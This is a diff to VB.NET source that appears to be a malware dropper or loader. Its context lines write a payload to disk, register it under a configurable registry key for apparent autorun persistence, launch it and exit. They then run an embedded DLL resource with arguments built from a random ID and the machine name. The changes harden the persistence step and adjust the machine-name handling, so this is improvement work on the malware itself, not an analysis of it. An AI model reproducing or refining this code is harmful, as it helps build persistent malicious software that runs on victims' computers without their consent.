@@ -59,7 +59,7 @@ Public Class Program
                     Drop.Write(Client, 0, Client.Length)
                 End Using
                 Thread.Sleep(2 * 1000)
-                Registry.CurrentUser.OpenSubKey(GetString("#REGKEY"), True).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
+                Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                 Process.Start(PayloadPath)
                 Environment.Exit(0)
             End If
@@ -187,7 +187,7 @@ Public Class Program
             End Try
             Dim argstr As String = GetString("#ARGSTR") + rS
             argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
+            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
             KillLastProc()
             Run(GetTheResource("#dll"), argstr, xm)
         Catch ex As Exception
